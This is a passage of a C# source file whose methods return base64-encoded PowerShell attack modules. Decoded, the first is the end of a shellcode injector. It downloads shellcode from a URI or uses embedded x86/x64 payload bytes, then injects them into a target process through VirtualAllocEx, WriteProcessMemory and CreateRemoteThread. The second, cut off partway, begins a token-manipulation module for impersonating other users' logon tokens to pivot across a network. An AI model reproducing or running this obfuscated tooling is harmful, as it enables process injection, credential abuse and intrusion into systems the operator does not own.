cm5ldCBTZXR0aW5ncycpLlByb3h5U2VydmVyCiAgICAgICAgICAgIAogICAgICAgICAgICAjIGlmIHRoZXJlIGlzIG5vIHByb3h5IHNldCwgdGhlbiBjb250aW51ZSB3aXRob3V0IGl0CiAgICAgICAgICAgIGlmICgkUHJveHlBZGRyZXNzKSAKICAgICAgICAgICAgewogICAgICAgICAgICAKICAgICAgICAgICAgICAgICRXZWJQcm94eU9iamVjdC5BZGRyZXNzID0gJFByb3h5QWRkcmVzcwogICAgICAgICAgICAgICAgJFdlYlByb3h5T2JqZWN0LlVzZURlZmF1bHRDcmVkZW50aWFscyA9ICRUcnVlCiAgICAgICAgICAgICAgICAkV2ViQ2xpZW50T2JqZWN0LlByb3h5ID0gJFdlYlByb3h5T2JqZWN0CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTMyID0gJFdlYkNsaWVudC5Eb3dubG9hZERhdGEoJFVyaSkKICAgICAgICB9CiAgICAgICAgY2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICIkKCRFcnJvclswXS5FeGNlcHRpb24uSW5uZXJFeGNlcHRpb24uSW5uZXJFeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgfQogICAgICAgIFtCeXRlW11dICRTaGVsbGNvZGU2NCA9ICRTaGVsbGNvZGUzMgoKICAgIH0KICAgIGVsc2VpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTaGVsbGNvZGUnXSkKICAgIHsKICAgICAgICAjIFVzZXJzIHBhc3NpbmcgaW4gc2hlbGxjb2RlICB0aHJvdWdoIHRoZSAnLVNoZWxsY29kZScgcGFyYW1ldGVyIGFyZSByZXNwb25zaWJsZSBmb3IgZW5zdXJpbmcgaXQgdGFyZ2V0cwogICAgICAgICMgdGhlIGNvcnJlY3QgYXJjaGl0ZWNodHVyZSAtIHg4NiB2cy4geDY0LiBUaGlzIHNjcmlwdCBoYXMgbm8gd2F5IHRvIHZhbGlkYXRlIHdoYXQgeW91IHByb3ZpZGUgaXQuCiAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTMyID0gJFNoZWxsY29kZQogICAgICAgIFtCeXRlW11dICRTaGVsbGNvZGU2NCA9ICRTaGVsbGNvZGUzMgogICAgfQogICAgZWxzZQogICAgewogICAgICAgICMgUG9wIGEgY2FsYy4uLiBvciB3aGF0ZXZlciBzaGVsbGNvZGUgeW91IGRlY2lkZSB0byBwbGFjZSBpbiBoZXJlCiAgICAgICAgIyBJIHNpbmNlcmVseSBob3BlIHlvdSB0cnVzdCB0aGF0IHRoaXMgc2hlbGxjb2RlIGFjdHVhbGx5IHBvcHMgYSBjYWxjLi4uCiAgICAgICAgIyBJbnNlcnQgeW91ciBzaGVsbGNvZGUgaGVyZSBpbiB0aGUgZm9yIDB4WFgsMHhYWCwuLi4KICAgICAgICAjIDMyLWJpdCBwYXlsb2FkCiAgICAgICAgIyBtc2ZwYXlsb2FkIHdpbmRvd3MvZXhlYyBDTUQ9ImNtZCAvayBjYWxjIiBFWElURlVOQz10aHJlYWQKICAgICAgICBbQnl0ZVtdXSAkU2hlbGxjb2RlMzIgPSBAKDB4ZmMsMHhlOCwweDg5LDB4MDAsMHgwMCwweDAwLDB4NjAsMHg4OSwweGU1LDB4MzEsMHhkMiwweDY0LDB4OGIsMHg1MiwweDMwLDB4OGIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDUyLDB4MGMsMHg4YiwweDUyLDB4MTQsMHg4YiwweDcyLDB4MjgsMHgwZiwweGI3LDB4NGEsMHgyNiwweDMxLDB4ZmYsMHgzMSwweGMwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhhYywweDNjLDB4NjEsMHg3YywweDAyLDB4MmMsMHgyMCwweGMxLDB4Y2YsMHgwZCwweDAxLDB4YzcsMHhlMiwweGYwLDB4NTIsMHg1NywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4OGIsMHg1MiwweDEwLDB4OGIsMHg0MiwweDNjLDB4MDEsMHhkMCwweDhiLDB4NDAsMHg3OCwweDg1LDB4YzAsMHg3NCwweDRhLDB4MDEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGQwLDB4NTAsMHg4YiwweDQ4LDB4MTgsMHg4YiwweDU4LDB4MjAsMHgwMSwweGQzLDB4ZTMsMHgzYywweDQ5LDB4OGIsMHgzNCwweDhiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMSwweGQ2LDB4MzEsMHhmZiwweDMxLDB4YzAsMHhhYywweGMxLDB4Y2YsMHgwZCwweDAxLDB4YzcsMHgzOCwweGUwLDB4NzUsMHhmNCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDMsMHg3ZCwweGY4LDB4M2IsMHg3ZCwweDI0LDB4NzUsMHhlMiwweDU4LDB4OGIsMHg1OCwweDI0LDB4MDEsMHhkMywweDY2LDB4OGIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDBjLDB4NGIsMHg4YiwweDU4LDB4MWMsMHgwMSwweGQzLDB4OGIsMHgwNCwweDhiLDB4MDEsMHhkMCwweDg5LDB4NDQsMHgyNCwweDI0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg1YiwweDViLDB4NjEsMHg1OSwweDVhLDB4NTEsMHhmZiwweGUwLDB4NTgsMHg1ZiwweDVhLDB4OGIsMHgxMiwweGViLDB4ODYsMHg1ZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NmEsMHgwMSwweDhkLDB4ODUsMHhiOSwweDAwLDB4MDAsMHgwMCwweDUwLDB4NjgsMHgzMSwweDhiLDB4NmYsMHg4NywweGZmLDB4ZDUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGJiLDB4ZTAsMHgxZCwweDJhLDB4MGEsMHg2OCwweGE2LDB4OTUsMHhiZCwweDlkLDB4ZmYsMHhkNSwweDNjLDB4MDYsMHg3YywweDBhLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg4MCwweGZiLDB4ZTAsMHg3NSwweDA1LDB4YmIsMHg0NywweDEzLDB4NzIsMHg2ZiwweDZhLDB4MDAsMHg1MywweGZmLDB4ZDUsMHg2MywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NjEsMHg2YywweDYzLDB4MDApCgogICAgICAgICMgNjQtYml0IHBheWxvYWQKICAgICAgICAjIG1zZnBheWxvYWQgd2luZG93cy94NjQvZXhlYyBDTUQ9ImNhbGMiIEVYSVRGVU5DPXRocmVhZAogICAgICAgIFtCeXRlW11dICRTaGVsbGNvZGU2NCA9IEAoMHhmYywweDQ4LDB4ODMsMHhlNCwweGYwLDB4ZTgsMHhjMCwweDAwLDB4MDAsMHgwMCwweDQxLDB4NTEsMHg0MSwweDUwLDB4NTIsMHg1MSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NTYsMHg0OCwweDMxLDB4ZDIsMHg2NSwweDQ4LDB4OGIsMHg1MiwweDYwLDB4NDgsMHg4YiwweDUyLDB4MTgsMHg0OCwweDhiLDB4NTIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDIwLDB4NDgsMHg4YiwweDcyLDB4NTAsMHg0OCwweDBmLDB4YjcsMHg0YSwweDRhLDB4NGQsMHgzMSwweGM5LDB4NDgsMHgzMSwweGMwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhhYywweDNjLDB4NjEsMHg3YywweDAyLDB4MmMsMHgyMCwweDQxLDB4YzEsMHhjOSwweDBkLDB4NDEsMHgwMSwweGMxLDB4ZTIsMHhlZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NTIsMHg0MSwweDUxLDB4NDgsMHg4YiwweDUyLDB4MjAsMHg4YiwweDQyLDB4M2MsMHg0OCwweDAxLDB4ZDAsMHg4YiwweDgwLDB4ODgsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDQ4LDB4ODUsMHhjMCwweDc0LDB4NjcsMHg0OCwweDAxLDB4ZDAsMHg1MCwweDhiLDB4NDgsMHgxOCwweDQ0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg4YiwweDQwLDB4MjAsMHg0OSwweDAxLDB4ZDAsMHhlMywweDU2LDB4NDgsMHhmZiwweGM5LDB4NDEsMHg4YiwweDM0LDB4ODgsMHg0OCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDEsMHhkNiwweDRkLDB4MzEsMHhjOSwweDQ4LDB4MzEsMHhjMCwweGFjLDB4NDEsMHhjMSwweGM5LDB4MGQsMHg0MSwweDAxLDB4YzEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDM4LDB4ZTAsMHg3NSwweGYxLDB4NGMsMHgwMywweDRjLDB4MjQsMHgwOCwweDQ1LDB4MzksMHhkMSwweDc1LDB4ZDgsMHg1OCwweDQ0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg4YiwweDQwLDB4MjQsMHg0OSwweDAxLDB4ZDAsMHg2NiwweDQxLDB4OGIsMHgwYywweDQ4LDB4NDQsMHg4YiwweDQwLDB4MWMsMHg0OSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDEsMHhkMCwweDQxLDB4OGIsMHgwNCwweDg4LDB4NDgsMHgwMSwweGQwLDB4NDEsMHg1OCwweDQxLDB4NTgsMHg1ZSwweDU5LDB4NWEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDQxLDB4NTgsMHg0MSwweDU5LDB4NDEsMHg1YSwweDQ4LDB4ODMsMHhlYywweDIwLDB4NDEsMHg1MiwweGZmLDB4ZTAsMHg1OCwweDQxLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg1OSwweDVhLDB4NDgsMHg4YiwweDEyLDB4ZTksMHg1NywweGZmLDB4ZmYsMHhmZiwweDVkLDB4NDgsMHhiYSwweDAxLDB4MDAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDQ4LDB4OGQsMHg4ZCwweDAxLDB4MDEsMHgwMCwweDAwLDB4NDEsMHhiYSwweDMxLDB4OGIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDZmLDB4ODcsMHhmZiwweGQ1LDB4YmIsMHhlMCwweDFkLDB4MmEsMHgwYSwweDQxLDB4YmEsMHhhNiwweDk1LDB4YmQsMHg5ZCwweGZmLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhkNSwweDQ4LDB4ODMsMHhjNCwweDI4LDB4M2MsMHgwNiwweDdjLDB4MGEsMHg4MCwweGZiLDB4ZTAsMHg3NSwweDA1LDB4YmIsMHg0NywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MTMsMHg3MiwweDZmLDB4NmEsMHgwMCwweDU5LDB4NDEsMHg4OSwweGRhLDB4ZmYsMHhkNSwweDYzLDB4NjEsMHg2YywweDYzLDB4MDApCiAgICB9CgogICAgaWYgKCAkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb2Nlc3NJRCddICkKICAgIHsKICAgICAgICAjIEluamVjdCBzaGVsbGNvZGUgaW50byB0aGUgc3BlY2lmaWVkIHByb2Nlc3MgSUQKICAgICAgICAkT3BlblByb2Nlc3NBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBPcGVuUHJvY2VzcwogICAgICAgICRPcGVuUHJvY2Vzc0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtVSW50MzJdLCBbQm9vbF0sIFtVSW50MzJdKSAoW0ludFB0cl0pCiAgICAgICAgJE9wZW5Qcm9jZXNzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJE9wZW5Qcm9jZXNzQWRkciwgJE9wZW5Qcm9jZXNzRGVsZWdhdGUpCiAgICAgICAgJFZpcnR1YWxBbGxvY0V4QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgVmlydHVhbEFsbG9jRXgKICAgICAgICAkVmlydHVhbEFsbG9jRXhEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtVaW50MzJdLCBbVUludDMyXSwgW1VJbnQzMl0pIChbSW50UHRyXSkKICAgICAgICAkVmlydHVhbEFsbG9jRXggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVmlydHVhbEFsbG9jRXhBZGRyLCAkVmlydHVhbEFsbG9jRXhEZWxlZ2F0ZSkKICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgV3JpdGVQcm9jZXNzTWVtb3J5CiAgICAgICAgJFdyaXRlUHJvY2Vzc01lbW9yeURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW0J5dGVbXV0sIFtVSW50MzJdLCBbVUludDMyXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pCiAgICAgICAgJFdyaXRlUHJvY2Vzc01lbW9yeSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRXcml0ZVByb2Nlc3NNZW1vcnlBZGRyLCAkV3JpdGVQcm9jZXNzTWVtb3J5RGVsZWdhdGUpCiAgICAgICAgJENyZWF0ZVJlbW90ZVRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIENyZWF0ZVJlbW90ZVRocmVhZAogICAgICAgICRDcmVhdGVSZW1vdGVUaHJlYWREZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSkgKFtJbnRQdHJdKQogICAgICAgICRDcmVhdGVSZW1vdGVUaHJlYWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQ3JlYXRlUmVtb3RlVGhyZWFkQWRkciwgJENyZWF0ZVJlbW90ZVRocmVhZERlbGVnYXRlKQogICAgICAgICRDbG9zZUhhbmRsZUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIENsb3NlSGFuZGxlCiAgICAgICAgJENsb3NlSGFuZGxlRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0pIChbQm9vbF0pCiAgICAgICAgJENsb3NlSGFuZGxlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJENsb3NlSGFuZGxlQWRkciwgJENsb3NlSGFuZGxlRGVsZWdhdGUpCiAgICAKICAgICAgICBXcml0ZS1WZXJib3NlICJJbmplY3Rpbmcgc2hlbGxjb2RlIGludG8gUElEOiAkUHJvY2Vzc0lkIgogICAgICAgIAogICAgICAgIGlmICggJEZvcmNlIC1vciAkcHNDbWRsZXQuU2hvdWxkQ29udGludWUoICdEbyB5b3Ugd2lzaCB0byBjYXJyeSBvdXQgeW91ciBldmlsIHBsYW5zPycsCiAgICAgICAgICAgICAgICAgIkluamVjdGluZyBzaGVsbGNvZGUgaW5qZWN0aW5nIGludG8gJCgoR2V0LVByb2Nlc3MgLUlkICRQcm9jZXNzSWQpLlByb2Nlc3NOYW1lKSAoJFByb2Nlc3NJZCkhIiApICkKICAgICAgICB7CiAgICAgICAgICAgIEluamVjdC1SZW1vdGVTaGVsbGNvZGUgJFByb2Nlc3NJZAogICAgICAgIH0KICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICAjIEluamVjdCBzaGVsbGNvZGUgaW50byB0aGUgY3VycmVudGx5IHJ1bm5pbmcgUG93ZXJTaGVsbCBwcm9jZXNzCiAgICAgICAgJFZpcnR1YWxBbGxvY0FkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxBbGxvYwogICAgICAgICRWaXJ0dWFsQWxsb2NEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VJbnQzMl0sIFtVSW50MzJdLCBbVUludDMyXSkgKFtJbnRQdHJdKQogICAgICAgICRWaXJ0dWFsQWxsb2MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVmlydHVhbEFsbG9jQWRkciwgJFZpcnR1YWxBbGxvY0RlbGVnYXRlKQogICAgICAgICRWaXJ0dWFsRnJlZUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxGcmVlCiAgICAgICAgJFZpcnR1YWxGcmVlRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVaW50MzJdLCBbVUludDMyXSkgKFtCb29sXSkKICAgICAgICAkVmlydHVhbEZyZWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVmlydHVhbEZyZWVBZGRyLCAkVmlydHVhbEZyZWVEZWxlZ2F0ZSkKICAgICAgICAkQ3JlYXRlVGhyZWFkQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgQ3JlYXRlVGhyZWFkCiAgICAgICAgJENyZWF0ZVRocmVhZERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0pIChbSW50UHRyXSkKICAgICAgICAkQ3JlYXRlVGhyZWFkID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJENyZWF0ZVRocmVhZEFkZHIsICRDcmVhdGVUaHJlYWREZWxlZ2F0ZSkKICAgICAgICAkV2FpdEZvclNpbmdsZU9iamVjdEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFdhaXRGb3JTaW5nbGVPYmplY3QKICAgICAgICAkV2FpdEZvclNpbmdsZU9iamVjdERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50MzJdKSAoW0ludF0pCiAgICAgICAgJFdhaXRGb3JTaW5nbGVPYmplY3QgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkV2FpdEZvclNpbmdsZU9iamVjdEFkZHIsICRXYWl0Rm9yU2luZ2xlT2JqZWN0RGVsZWdhdGUpCiAgICAgICAgCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiSW5qZWN0aW5nIHNoZWxsY29kZSBpbnRvIFBvd2VyU2hlbGwiCiAgICAgICAgCiAgICAgICAgaWYgKCAkRm9yY2UgLW9yICRwc0NtZGxldC5TaG91bGRDb250aW51ZSggJ0RvIHlvdSB3aXNoIHRvIGNhcnJ5IG91dCB5b3VyIGV2aWwgcGxhbnM/JywKICAgICAgICAgICAgICAgICAiSW5qZWN0aW5nIHNoZWxsY29kZSBpbnRvIHRoZSBydW5uaW5nIFBvd2VyU2hlbGwgcHJvY2VzcyEiICkgKQogICAgICAgIHsKICAgICAgICAgICAgSW5qZWN0LUxvY2FsU2hlbGxjb2RlCiAgICAgICAgfQogICAgfSAgIAp9Cgp9IC1OYW1lIEludm9rZS1TaGVsbENvZGUK"));
        }

        public static string InvokeTokenManipulation()
        {
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@"TmV3LU1vZHVsZSAtU2NyaXB0QmxvY2sgewoKZnVuY3Rpb24gSW52b2tlLVRva2VuTWFuaXB1bGF0aW9uCnsKPCMKLlNZTk9QU0lTCgpUaGlzIHNjcmlwdCByZXF1aXJlcyBBZG1pbmlzdHJhdG9yIHByaXZpbGVnZXMuIEl0IGNhbiBlbnVtZXJhdGUgdGhlIExvZ29uIFRva2VucyBhdmFpbGFibGUgYW5kIHVzZSB0aGVtIHRvIGNyZWF0ZSBuZXcgcHJvY2Vzc2VzLiBUaGlzIGFsbG93cyB5b3UgdG8gdXNlCmFub3RoZXJzIHVzZXJzIGNyZWRlbnRpYWxzIG92ZXIgdGhlIG5ldHdvcmsgYnkgY3JlYXRpbmcgYSBwcm9jZXNzIHdpdGggdGhlaXIgbG9nb24gdG9rZW4uIFRoaXMgd2lsbCB3b3JrIGV2ZW4gd2l0aCBXaW5kb3dzIDguMSBMU0FTUyBwcm90ZWN0aW9ucy4KVGhpcyBmdW5jdGlvbmFsaXR5IGlzIHZlcnkgc2ltaWxhciB0byB0aGUgaW5jb2duaXRvIHRvb2wgKHdpdGggc29tZSBkaWZmZXJlbmNlcywgYW5kIGRpZmZlcmVudCB1c2UgZ29hbHMpLgoKVGhpcyBzY3JpcHQgY2FuIGFsc28gbWFrZSB0aGUgUG93ZXJTaGVsbCB0aHJlYWQgaW1wZXJzb25hdGUgYW5vdGhlciB1c2VycyBMb2dvbiBUb2tlbi4gVW5mb3J0dW5hdGVseSB0aGlzIGRvZXNuJ3Qgd29yayB3ZWxsLCBiZWNhdXNlIFBvd2VyU2hlbGwKY3JlYXRlcyBuZXcgdGhyZWFkcyB0byBkbyB0aGluZ3MsIGFuZCB0aG9zZSB0aHJlYWRzIHdpbGwgdXNlIHRoZSBQcmltYXJ5IHRva2VuIG9mIHRoZSBQb3dlclNoZWxsIHByb2Nlc3MgKHlvdXIgb3JpZ2luYWwgdG9rZW4pIGFuZCBub3QgdGhlIHRva2VuCnRoYXQgb25lIHRocmVhZCBpcyBpbXBlcnNvbmF0aW5nLiBCZWNhdXNlIG9mIHRoaXMsIHlvdSBjYW5ub3QgdXNlIHRocmVhZCBpbXBlcnNvbmF0aW9uIHRvIGltcGVyc29uYXRlIGEgdXNlciBhbmQgdGhlbiB1c2UgUG93ZXJTaGVsbCByZW1vdGluZyB0byBjb25uZWN0CnRvIGFub3RoZXIgc2VydmVyIGFzIHRoYXQgdXNlciAoaXQgd2lsbCBhdXRoZW50aWNhdGUgdXNpbmcgdGhlIHByaW1hcnkgdG9rZW4gb2YgdGhlIHByb2Nlc3MsIHdoaWNoIGlzIHlvdXIgb3JpZ2luYWwgbG9nb24gdG9rZW4pLgoKQmVjYXVzZSBvZiB0aGlzIGxpbWl0YXRpb24sIHRoZSByZWNvbW1lbmRlZCB3YXkgdG8gdXNlIHRoaXMgc2NyaXB0IGlzIHRvIHVzZSBDcmVhdGVQcm9jZXNzIHRvIGNyZWF0ZSBhIG5ldyBQb3dlclNoZWxsIHByb2Nlc3Mgd2l0aCBhbm90aGVyIHVzZXJzIExvZ29uIApUb2tlbiwgYW5kIHRoZW4gdXNlIHRoaXMgcHJvY2VzcyB0byBwaXZvdC4gVGhpcyB3b3JrcyBiZWNhdXNlIHRoZSBlbnRpcmUgcHJvY2VzcyBpcyBjcmVhdGVkIHVzaW5nIHRoZSBvdGhlciB1c2VycyBMb2dvbiBUb2tlbiwgc28gaXQgd2lsbCB1c2UgdGhlaXIKY3JlZGVudGlhbHMgZm9yIHRoZSBhdXRoZW50aWNhdGlvbi4KCklNUE9SVEFOVDogSWYgeW91IGFyZSBjcmVhdGluZyBhIHByb2Nlc3MsIGJ5IGRlZmF1bHQgdGhpcyBzY3JpcHQgd2lsbCBtb2RpZnkgdGhlIEFDTCBvZiB0aGUgY3VycmVudCB1c2VycyBkZXNrdG9wIHRvIGFsbG93IGZ1bGwgY29udHJvbCB0byAiRXZlcnlvbmUiLiAKVGhpcyBpcyBkb25lIHNvIHRoYXQgdGhlIFVJIG9mIHRoZSBwcm9jZXNzIGlzIHNob3duLiBJZiB5b3UgZG8gbm90IG5lZWQgdGhlIFVJLCB1c2UgdGhlIC1Ob1VJIGZsYWcgdG8gcHJldmVudCB0aGUgQUNMIGZyb20gYmVpbmcgbW9kaWZpZWQuIFRoaXMgQUNMCmlzIG5vdCBwZXJtZW5hbnQsIGFzIGluLCB3aGVuIHRoZSBjdXJyZW50IGxvZ3Mgb2ZmIHRoZSBBQ0wgaXMgY2xlYXJlZC4gSXQgaXMgc3RpbGwgcHJlZmVycmFibGUgdG8gbm90IG1vZGlmeSB0aGluZ3MgdW5sZXNzIHRoZXkgbmVlZCB0byBiZSBtb2RpZmllZCB0aG91Z2gsCnNvIEkgY3JlYXRlZCB0aGUgTm9VSSBmbGFnLiBBTFNPOiBXaGVuIGNyZWF0aW5nIGEgcHJvY2VzcywgdGhlIHNjcmlwdCB3aWxsIHJlcXVlc3QgU2VTZWN1cml0eVByaXZpbGVnZSBzbyBpdCBjYW4gZW51bWVyYXRlIGFuZCBtb2RpZnkgdGhlIEFDTCBvZiB0aGUgZGVza3RvcC4KVGhpcyBjb3VsZCBzaG93IHVwIGluIGxvZ3MgZGVwZW5kaW5nIG9uIHRoZSBsZXZlbCBvZiBtb25pdG9yaW5nLgoKClBFUk1JU1NJT05TIFJFUVVJUkVEOgpTZVNlY3VyaXR5UHJpdmlsZWdlOiBOZWVkZWQgaWYgbGF1bmNoaW5nIGEgcHJvY2VzcyB3aXRoIGEgVUkgdGhhdCBuZWVkcyB0byBiZSByZW5kZXJlZC4gVXNpbmcgdGhlIC1Ob1VJIGZsYWcgYmxvY2tzIHRoaXMuClNlQXNzaWduUHJpbWFyeVRva2VuUHJpdmlsZWdlIDogTmVlZGVkIGlmIGxhdW5jaGluZyBhIHByb2Nlc3Mgd2hpbGUgdGhlIHNjcmlwdCBpcyBydW5uaW5nIGluIFNlc3Npb24gMC4KCgpJbXBvcnRhbnQgZGlmZmVyZW5jZXMgZnJvbSBpbmNvZ25pdG86CkZpcnN0IG9mIGFsbCwgeW91IHNob3VsZCBwcm9iYWJseSByZWFkIHRoZSBpbmNvZ25pdG8gd2hpdGUgcGFwZXIgdG8gdW5kZXJzdGFuZCB3aGF0IGluY29nbml0byBkb2VzLiBJZiB5b3UgdXNlIGluY29nbml0bywgeW91J2xsIG5vdGljZSBpdCBkaWZmZXJlbnRpYXRlcwpiZXR3ZWVuICJJbXBlcnNvbmF0aW9uIiBhbmQgIkRlbGVnYXRpb24iIHRva2Vucy4gVGhpcyBpcyBiZWNhdXNlIGluY29nbml0byBjYW4gYmUgdXNlZCBpbiBzaXR1YXRpb25zIHdoZXJlIHlvdSBnZXQgcmVtb3RlIGNvZGUgZXhlY3V0aW9uIGFnYWluc3QgYSBzZXJ2aWNlCndoaWNoIGhhcyB0aHJlYWRzIGltcGVyc29uYXRpbmcgbXVsdGlwbGUgdXNlcnMuIEluY29nbml0byBjYW4gZW51bWVyYXRlIGFsbCB0b2tlbnMgYXZhaWxhYmxlIHRvIHRoZSBzZXJ2aWNlIHByb2Nlc3MsIGFuZCBpbXBlcnNvbmF0ZSB0aGVtICh3aGljaCBtaWdodCBhbGxvdwp5b3UgdG8gZWxldmF0ZSBwcml2aWxlZ2VzKS4gVGhpcyBzY3JpcHQgbXVzdCBiZSBydW4gYXMgYWRtaW5pc3RyYXRvciwgYW5kIGJlY2F1c2UgeW91IGFyZSBhbHJlYWR5IGFuIGFkbWluaXN0cmF0b3IsIHRoZSBwcmltYXJ5IHVzZSBvZiB0aGlzIHNjcmlwdCBpcyBmb3IgcGl2b3RpbmcKd2l0aG91dCBkdW1waW5nIGNyZWRlbnRpYWxzLiAKCkluIHRoaXMgc2l0dWF0aW9uLCBJbXBlcnNvbmF0aW9uIHZzIERlbGVnYXRpb24gZG9lcyBub3QgbWF0dGVyIGJlY2F1c2UgYW4gYWRtaW5pc3RyYXRvciBjYW4gdHVybiBhbnkgdG9rZW4gaW4gdG8gYSBwcmltYXJ5IHRva2VuIChkZWxlZ2F0aW9uIHJpZ2h0cykuIFdoYXQgZG9lcwptYXR0ZXIgaXMgdGhlIGxvZ29uIHR5cGUgdXNlZCB0byBjcmVhdGUgdGhlIGxvZ29uIHRva2VuLiBJZiBhIHVzZXIgY29ubmVjdHMgdXNpbmcgTmV0d29yayBMb2dvbiAoYWthIHR5cGUgMyBsb2dvbiksIHRoZSBjb21wdXRlciB3aWxsIG5vdCBoYXZlIGFueSBjcmVkZW50aWFscyBmb3IgCnRoZSB1c2VyLiBTaW5jZSB0aGUgY29tcHV0ZXIgaGFzIG5